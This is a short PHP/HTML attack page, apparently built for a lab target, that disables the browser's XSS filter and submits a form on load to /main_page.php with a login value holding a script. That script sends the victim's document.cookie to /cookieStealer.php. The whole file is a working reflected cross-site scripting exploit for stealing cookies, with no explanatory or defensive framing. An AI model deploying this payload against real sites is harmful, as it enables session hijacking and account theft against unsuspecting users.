<?php
	header('X-XSS-Protection:0');
?>
<html>
	<head>
	</head>
	<body>
		<form action="/main_page.php?xss_protection=0" method="get">
		<input type="text" name="login" value="<script>window.location='/cookieStealer.php?'+document.cookie</script>"/></form>
	</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script>
	$(document).ready(function() {
		var form = $('form');
		form.submit();
	});
</script>
</html>
